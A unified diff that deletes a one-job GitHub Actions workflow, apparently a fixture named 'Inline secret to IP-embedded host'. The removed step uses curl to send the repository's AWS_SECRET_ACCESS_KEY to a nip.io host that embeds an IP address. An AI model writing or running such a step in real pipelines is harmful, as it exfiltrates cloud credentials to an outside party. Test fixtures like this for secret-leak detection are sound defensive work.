@@ -1,7 +1,0 @@
-name: Inline secret to IP-embedded host
-on: workflow_dispatch
-jobs:
-  send:
-    runs-on: ubuntu-latest
-    steps:
-      - run: curl -s "https://1-2-3-4.nip.io/c?k=${{ secrets.AWS_SECRET_ACCESS_KEY }}"
